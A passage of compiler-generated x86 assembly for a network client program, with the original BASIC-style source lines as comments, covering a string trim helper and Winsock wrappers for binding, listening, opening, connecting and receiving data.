	jmp	for.0035.client			;;; i231
end.for.0035.client:
;
; [713] str$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [714] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func35.client			;;; i258
;
; [715] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetToken.client:  ;;; Function end label for Assembly Programmers.
end.func35.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetToken ()  *****
;  *****
;
; [717] FUNCTION STRING trim (str$,char)
.code
;
#ifdef trim.str$
#undef trim.str$
#endif
#define trim.str$ ebp+8	; exposes function argument 'str$'
;
;
#ifdef trim.char
#undef trim.char
#endif
#define trim.char ebp+12	; exposes function argument 'char'
;
align 16
_trim.client@8:
;  *****
;  *****  FUNCTION  trim ()  *****
;  *****
func41.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func41.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody41.client:
;
; [720] IFZ str$ THEN RETURN ""
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.119			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0037.client			;;; i192
A.119:
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func41.client			;;; i258
else.0037.client:
end.if.0037.client:
;
; [721] out$=""
#ifdef trim.out$
#undef trim.out$
#endif
#define trim.out$ ebp-40	; exposes local variable 'out$'
;
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [723] FOR p = 0 TO LEN (str$)-1
#ifdef trim.p
#undef trim.p
#endif
#define trim.p ebp-44	; exposes local variable 'p'
;
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.120			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.120:
	sub	eax,1			;;; i791
; .forlimit41.0038 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
align 8
for.0038.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0038.client			;;; i154
;
; [724] IF str${p} != char THEN out$ = out$ + CHR$(str${p})
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	ebx,d[ebp+12]			;;; i665
	cmp	eax,ebx			;;; i684a
	je	>> else.0039.client			;;; i219
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_chr.d			;;; i575
	add	esp,64			;;; i600
	mov	ebx,[ebp-40]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0039.client:
end.if.0039.client:
;
; [725] NEXT p
do.next.0038.client:
	inc	d[ebp-44]			;;; i229
	jmp	for.0038.client			;;; i231
end.for.0038.client:
;
; [727] str$ = out$
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [728] RETURN str$
	mov	eax,[ebp+8]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func41.client			;;; i258
;
; [730] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.trim.client:  ;;; Function end label for Assembly Programmers.
end.func41.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func41.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func41.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  trim ()  *****
;  *****
;
; [732] FUNCTION sBind (socket,ipaddress$,port)
.code
;
#ifdef sBind.socket
#undef sBind.socket
#endif
#define sBind.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef sBind.ipaddress$
#undef sBind.ipaddress$
#endif
#define sBind.ipaddress$ ebp+12	; exposes function argument 'ipaddress$'
;
;
#ifdef sBind.port
#undef sBind.port
#endif
#define sBind.port ebp+16	; exposes function argument 'port'
;
align 16
_sBind.client@12:
;  *****
;  *****  FUNCTION  sBind ()  *****
;  *****
func2D.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func2D.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.132:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.132			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,172			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody2D.client:
;
; [733] SOCKADDR_IN udtSocket
; .composites = ebp-40	; internal variable
#ifdef sBind.udtSocket
#undef sBind.udtSocket
#endif
#define sBind.udtSocket ebp-44	; exposes local variable 'udtSocket'
;
;
; [736] GetIPAddr (ipaddress$, @numIPAddr$)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk2D.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
#ifdef sBind.numIPAddr$
#undef sBind.numIPAddr$
#endif
#define sBind.numIPAddr$ ebp-56	; exposes local variable 'numIPAddr$'
;
	push	[ebp-56]			;;; i674a
	push	[ebp-52]			;;; i674a
	call	func4C.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-56],ecx			;;; i670
	add	esp,8			;;; i633
;
; [737] address$$ = inet_addr (&numIPAddr$)
#ifdef sBind.address$$
#undef sBind.address$$
#endif
#define sBind.address$$ ebp-64	; exposes local variable 'address$$'
;
	mov	eax,d[ebp-56]			;;; i642
	push	eax			;;; i667a
	call	_inet_addr@4			;;; i619
	mov	edx,eax			;;; i406
	sar	edx,31			;;; i407
	mov	d[ebp-64],eax			;;; i670
	mov	d[ebp-60],edx
;
; [738] IF (address$$ <= 0) THEN address$$ = $$INADDR_ANY
	mov	eax,d[ebp-64]			;;; i665
	mov	edx,d[ebp-60]
	mov	ebx,0			;;; i659
	mov	ecx,ebx			;;; i406
	sar	ecx,31			;;; i407
	cmp	edx,ecx			;;; i685a
;>peep
	je	> A.125			;;; i707
	mov	eax,0
	jle	> A.126			;;; i708
	jmp	> A.127			;;; i709
A.125:
	cmp	eax,ebx			;;; i710
	mov	eax,0
	ja	> A.127			;;; i711
A.126:
	not	eax			;;; i712
A.127:
;+peep
	test	eax,eax			;;; i220
	jz	>> else.003A.client			;;; i221
	mov	eax,0			;;; i659
	mov	edx,eax			;;; i406
	sar	edx,31			;;; i407
	mov	d[ebp-64],eax			;;; i670
	mov	d[ebp-60],edx
else.003A.client:
end.if.003A.client:
;
; [739] IF (port <= 0) THEN port = 0
	mov	eax,d[ebp+16]			;;; i665
	cmp	eax,0			;;; i684a
	jg	>> else.003B.client			;;; i219
	mov	eax,0			;;; i659
	mov	d[ebp+16],eax			;;; i670
else.003B.client:
end.if.003B.client:
;
; [741] udtSocket.sin_family = $$AF_INET
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,2			;;; i659
	mov	w[eax],bx			;;; i13b
;
; [742] udtSocket.sin_port = htons (port)
;
; [0] EXTERNAL SFUNCTION  htons            (hostshort)
	push	[ebp+16]			;;; i674a
	call	_htons@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	w[ebx+2],ax			;;; i13b
;
; [743] udtSocket.sin_addr = address$$
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-64]			;;; i665
	mov	ecx,d[ebp-60]
	or	ebx,ebx			;;; i417
	jns	> A.128			;;; i418
	not	ecx			;;; i419
A.128:
	test	ecx,ecx			;;; i420
	jz	> A.129			;;; i421a
	call	%_eeeOverflow			;;; i421b
A.129:
	mov	d[eax+4],ebx			;;; i13b
;
; [745] length = LEN (udtSocket)
#ifdef sBind.length
#undef sBind.length
#endif
#define sBind.length ebp-68	; exposes local variable 'length'
;
	mov	eax,16			;;; i584
	mov	d[ebp-68],eax			;;; i670
;
; [747] IF bind (socket, &udtSocket, length) == $$SOCKET_ERROR THEN
;
; [0] EXTERNAL SFUNCTION  bind             (socket, addrSOCKADDR, length)
	mov	eax,d[ebp-44]			;;; i642
	mov	d[ebp-52],eax			;;; i670
	push	[ebp-68]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_bind@12			;;; i619
	cmp	eax,-1			;;; i684a
	jne	>> else.003C.client			;;; i219
;
; [748] Sleep (10)
	push	10			;;; i656a
	call	_Sleep@4			;;; i619
;
; [749] CPrint ($$main,"* bind error: "+WSAErrorToName(WSAGetLastError()))
	call	_WSAGetLastError@0			;;; i619
	push	eax			;;; i667a
	call	func44.client			;;; i619
	mov	ebx,addr @_string.01F4.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [750] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func2D.client			;;; i258
;
; [751] ELSE
	jmp	end.if.003C.client			;;; i107
else.003C.client:
;
; [752] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func2D.client			;;; i258
;
; [753] END IF
end.if.003C.client:
;
; [756] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.sBind.client:  ;;; Function end label for Assembly Programmers.
end.func2D.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func2D.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
free.func2D.client:
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  sBind ()  *****
;  *****
;
; [758] FUNCTION sListen (socket)
.code
;
#ifdef sListen.socket
#undef sListen.socket
#endif
#define sListen.socket ebp+8	; exposes function argument 'socket'
;
align 16
_sListen.client@4:
;  *****
;  *****  FUNCTION  sListen ()  *****
;  *****
func2E.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody2E.client:
;
; [761] IF listen (socket, 1) == $$SOCKET_ERROR THEN
;
; [0] EXTERNAL SFUNCTION  listen           (socket, backlog)
	push	1			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_listen@8			;;; i619
	cmp	eax,-1			;;; i684a
	jne	>> else.003D.client			;;; i219
;
; [762] Sleep (10)
	push	10			;;; i656a
	call	_Sleep@4			;;; i619
;
; [763] CPrint ($$main,"* listen error: "+WSAErrorToName(WSAGetLastError()))
	call	_WSAGetLastError@0			;;; i619
	push	eax			;;; i667a
	call	func44.client			;;; i619
	mov	ebx,addr @_string.01F6.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [764] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func2E.client			;;; i258
;
; [765] ELSE
	jmp	end.if.003D.client			;;; i107
else.003D.client:
;
; [766] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func2E.client			;;; i258
;
; [767] END IF
end.if.003D.client:
;
; [769] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.sListen.client:  ;;; Function end label for Assembly Programmers.
end.func2E.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  sListen ()  *****
;  *****
;
; [772] FUNCTION sOpen (socket)
.code
;
#ifdef sOpen.socket
#undef sOpen.socket
#endif
#define sOpen.socket ebp+8	; exposes function argument 'socket'
;
align 16
_sOpen.client@4:
;  *****
;  *****  FUNCTION  sOpen ()  *****
;  *****
func2F.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody2F.client:
;
; [775] socket = socket ($$AF_INET, $$SOCK_STREAM, 0)
;
; [0] EXTERNAL SFUNCTION  socket           (domain, type, protocol)
	push	0			;;; i656a
	push	1			;;; i656a
	push	2			;;; i656a
	call	_socket@12			;;; i619
	mov	d[ebp+8],eax			;;; i670
;
; [776] IFZ socket THEN
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.003E.client			;;; i195
;
; [777] Sleep (10)
	push	10			;;; i656a
	call	_Sleep@4			;;; i619
;
; [778] CPrint ($$main,"* create socket error: "+WSAErrorToName(WSAGetLastError()))
	call	_WSAGetLastError@0			;;; i619
	push	eax			;;; i667a
	call	func44.client			;;; i619
	mov	ebx,addr @_string.01F9.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [779] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func2F.client			;;; i258
;
; [780] ELSE
	jmp	end.if.003E.client			;;; i107
else.003E.client:
;
; [781] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func2F.client			;;; i258
;
; [782] END IF
end.if.003E.client:
;
; [784] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.sOpen.client:  ;;; Function end label for Assembly Programmers.
end.func2F.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  sOpen ()  *****
;  *****
;
; [786] FUNCTION sConnect (idx)
.code
;
#ifdef sConnect.idx
#undef sConnect.idx
#endif
#define sConnect.idx ebp+8	; exposes function argument 'idx'
;
align 16
_sConnect.client@4:
;  *****
;  *****  FUNCTION  sConnect ()  *****
;  *****
func2C.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func2C.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.140:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.140			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody2C.client:
;
; [787] SOCKADDR_IN udtSocket
; .composites = ebp-40	; internal variable
#ifdef sConnect.udtSocket
#undef sConnect.udtSocket
#endif
#define sConnect.udtSocket ebp-44	; exposes local variable 'udtSocket'
;
;
; [790] getSPServer (idx,@ipaddress$,@port,password$,@socket)
#ifdef sConnect.ipaddress$
#undef sConnect.ipaddress$
#endif
#define sConnect.ipaddress$ ebp-48	; exposes local variable 'ipaddress$'
;
#ifdef sConnect.port
#undef sConnect.port
#endif
#define sConnect.port ebp-52	; exposes local variable 'port'
;
#ifdef sConnect.password$
#undef sConnect.password$
#endif
#define sConnect.password$ ebp-56	; exposes local variable 'password$'
;
	mov	eax,d[ebp-56]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk2C.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
#ifdef sConnect.socket
#undef sConnect.socket
#endif
#define sConnect.socket ebp-68	; exposes local variable 'socket'
;
	push	[ebp-68]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func48.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	ecx,d[esp+4]			;;; i877a
	mov	ebx,d[esp+8]			;;; i877b
	mov	[ebp-48],ecx			;;; i670
	mov	d[ebp-52],ebx			;;; i670
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+16]			;;; i877a
	mov	d[ebp-68],ecx			;;; i670
	add	esp,20			;;; i633
;
; [792] udtSocket.sin_family = $$AF_INET
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,2			;;; i659
	mov	w[eax],bx			;;; i13b
;
; [793] udtSocket.sin_port = htons (port)
	push	[ebp-52]			;;; i674a
	call	_htons@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	w[ebx+2],ax			;;; i13b
;
; [794] udtSocket.sin_addr = inet_addr (&ipaddress$)
	mov	eax,d[ebp-48]			;;; i642
	push	eax			;;; i667a
	call	_inet_addr@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+4],eax			;;; i13b
;
; [796] IF udtSocket.sin_addr = $$INADDR_NONE THEN
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	cmp	eax,-1			;;; i684a
	jne	>> else.003F.client			;;; i219
;
; [797] GetIPAddr (ipaddress$, @numIPAddr$)
	mov	eax,d[ebp-48]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-64],eax			;;; i670
#ifdef sConnect.numIPAddr$
#undef sConnect.numIPAddr$
#endif
#define sConnect.numIPAddr$ ebp-72	; exposes local variable 'numIPAddr$'
;
	push	[ebp-72]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	func4C.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-72],ecx			;;; i670
	add	esp,8			;;; i633
;
; [798] udtSocket.sin_addr = inet_addr (&numIPAddr$)
	mov	eax,d[ebp-72]			;;; i642
	push	eax			;;; i667a
	call	_inet_addr@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+4],eax			;;; i13b
;
; [799] END IF
else.003F.client:
end.if.003F.client:
;
; [801] IF (connect (socket, &udtSocket, SIZE(udtSocket)) == $$SOCKET_ERROR) THEN
;
; [0] EXTERNAL SFUNCTION  connect          (socket, addrSOCKADDR, length)
	mov	eax,d[ebp-44]			;;; i642
	mov	d[ebp-64],eax			;;; i670
	mov	eax,16			;;; i584
	push	eax			;;; i667a
	push	[ebp-64]			;;; i674a
	push	[ebp-68]			;;; i674a
	call	_connect@12			;;; i619
	cmp	eax,-1			;;; i684a
	jne	>> else.0040.client			;;; i219
;
; [802] Sleep(10)
	push	10			;;; i656a
	call	_Sleep@4			;;; i619
;
; [803] CPrint ($$main,"* connect error: "+WSAErrorToName(WSAGetLastError()))
	call	_WSAGetLastError@0			;;; i619
	push	eax			;;; i667a
	call	func44.client			;;; i619
	mov	ebx,addr @_string.0202.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [804] closesocket (socket)
;
; [0] EXTERNAL SFUNCTION  closesocket      (socket)
	push	[ebp-68]			;;; i674a
	call	_closesocket@4			;;; i619
;
; [805] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func2C.client			;;; i258
;
; [806] ELSE
	jmp	end.if.0040.client			;;; i107
else.0040.client:
;
; [807] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func2C.client			;;; i258
;
; [808] END IF
end.if.0040.client:
;
; [810] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.sConnect.client:  ;;; Function end label for Assembly Programmers.
end.func2C.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func2C.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func2C.client:
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-72]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  sConnect ()  *****
;  *****
;
; [812] FUNCTION sMessageListenBin (socket,size,lpbuffer)
.code
;
#ifdef sMessageListenBin.socket
#undef sMessageListenBin.socket
#endif
#define sMessageListenBin.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef sMessageListenBin.size
#undef sMessageListenBin.size
#endif
#define sMessageListenBin.size ebp+12	; exposes function argument 'size'
;
;
#ifdef sMessageListenBin.lpbuffer
#undef sMessageListenBin.lpbuffer
#endif
#define sMessageListenBin.lpbuffer ebp+16	; exposes function argument 'lpbuffer'
;
align 16
_sMessageListenBin.client@12:
;  *****
;  *****  FUNCTION  sMessageListenBin ()  *****
;  *****
func40.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody40.client:
;
; [813] ULONG total
#ifdef sMessageListenBin.total
#undef sMessageListenBin.total
#endif
#define sMessageListenBin.total ebp-40	; exposes local variable 'total'
;
;
; [815] IF !size || !lpbuffer THEN RETURN $$FALSE
	mov	eax,d[ebp+12]			;;; i665
	neg	eax			;;; i888
	cmc				;;; i889
	rcr	eax,1			;;; i890
	sar	eax,31			;;; i891
	mov	ebx,d[ebp+16]			;;; i665
	neg	ebx			;;; i888
	cmc				;;; i889
	rcr	ebx,1			;;; i890
	sar	ebx,31			;;; i891
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.0041.client			;;; i221
	mov	eax,0			;;; i659
	jmp	end.func40.client			;;; i258
else.0041.client:
end.if.0041.client:
;
; [816] total = size
	mov	eax,d[ebp+12]			;;; i665
	mov	d[ebp-40],eax			;;; i670
;
; [818] DO
align 8
do.0042.client:
;
; [819] '		CPrint ($$main,"waiting...")
;
; [820] bytesRecv = recv (socket, lpbuffer, total, 0)
#ifdef sMessageListenBin.bytesRecv
#undef sMessageListenBin.bytesRecv
#endif
#define sMessageListenBin.bytesRecv ebp-44	; exposes local variable 'bytesRecv'
;
;
; [0] EXTERNAL SFUNCTION  recv             (socket, addrBuffer, length, flags)
	push	0			;;; i656a
	push	[ebp-40]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_recv@16			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [821] '		CPrint ($$main,STRING$(bytesRecv))
;
; [822] IF (bytesRecv == $$SOCKET_ERROR) THEN RETURN $$FALSE
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,-1			;;; i684a
	jne	>> else.0043.client			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func40.client			;;; i258
else.0043.client:
end.if.0043.client:
;
; [823] IF (bytesRecv == 0) THEN EXIT DO
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,0			;;; i684a
	jne	>> else.0044.client			;;; i219
	jmp	end.do.0042.client			;;; i144
else.0044.client:
end.if.0044.client:
;
; [825] total = total - bytesRecv
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,d[ebp-44]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[ebp-40],eax			;;; i670
;
; [826] lpbuffer = lpbuffer + bytesRecv
	mov	eax,d[ebp+16]			;;; i665
	mov	ebx,d[ebp-44]			;;; i665
	add	eax,ebx			;;; i775
	mov	d[ebp+16],eax			;;; i670
;
; [827] LOOP WHILE (total > 0) && (#CONNECTED == $$TRUE)
do.loop.0042.client:
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,0			;;; i659
	or	ebx,ebx			;;; i366
	jns	> A.142			;;; i367
	call	%_eeeOverflow			;;; i368
A.142:
	cmp	eax,ebx			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jbe	> A.143			;;; i467
	not	eax			;;; i468
A.143:
;+peep
	mov	ebx,d[%#CONNECTED.client]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.144			;;; i467
	not	ebx			;;; i468
A.144:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i194
	jnz	< do.0042.client			;;; i195
end.do.0042.client:
;
; [829] size = total
	mov	eax,d[ebp-40]			;;; i665
